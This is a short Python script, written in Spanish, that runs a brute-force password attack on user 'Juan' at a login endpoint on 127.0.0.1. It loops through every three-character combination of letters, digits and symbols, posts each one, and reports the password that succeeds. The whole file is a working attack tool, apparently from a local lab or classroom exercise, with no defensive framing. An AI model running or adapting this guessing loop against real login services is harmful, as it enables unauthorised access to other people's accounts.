import requests
import time


URL_LOGIN = "http://127.0.0.1:8000/login"
USUARIO = "Juan"
RETRASO = 0.01  

mayusculas = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
minusculas = "abcdefghijklmnopqrstuvwxyz"
numeros = "1234567890"
simbolos = "~!@#$%^&*`"

alfabeto = mayusculas + minusculas + numeros + simbolos

def iniciar_ataque():
    inicio = time.time()
    intentos = 0
    
    print(f"[*] Atacando a: {USUARIO}")

    for letra1 in alfabeto:
        for letra2 in alfabeto:
            for letra3 in alfabeto:
                
                intento = letra1 + letra2 + letra3
                
                datos = {"nombre": USUARIO, "password": intento}
                
                respuesta = requests.post(URL_LOGIN, json=datos)
            
                if respuesta.status_code == 200:
                    if respuesta.json().get("message") == "login exitoso":
                        fin = time.time()
                        print(f"\n\n ¡ÉXITO! Contraseña encontrada: {intento}")
                        print(f" Tiempo total: {round(fin - inicio, 2)} segundos")
                        return 

                time.sleep(RETRASO)
                
                intentos += 1
                if intentos % 50 == 0:
                    print(f" > Intentos: {intentos} | Probando: {intento} ", end="\r")

if __name__ == "__main__":
    iniciar_ataque()